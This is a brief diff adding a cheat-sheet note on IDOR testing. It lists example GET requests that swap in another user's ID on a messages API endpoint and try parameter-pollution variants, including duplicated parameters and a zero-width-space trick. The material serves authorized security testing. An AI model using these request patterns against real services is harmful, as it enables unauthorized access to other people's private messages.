@@ -1,0 +1,11 @@
+IDOR
+
+Suppose you find endpoint for IDOR
+	GET /api_v1/messages?user_id=Your_user_id
+Try regular IDOR
+	GET /api_v1/messages?user_id=Another_user_id
+Try parameter pollution
+	GET /api_v1/messages?user_id=Your_user_id&user_id=Another_user_id
+	GET /api_v1/messages?user_id=Another_user_id user_id=Your_user_id
+	GET /api_v1/messages?user_id[zero-width space]=Another_user_id user_id[zero-width space]=Your_user_id
+	
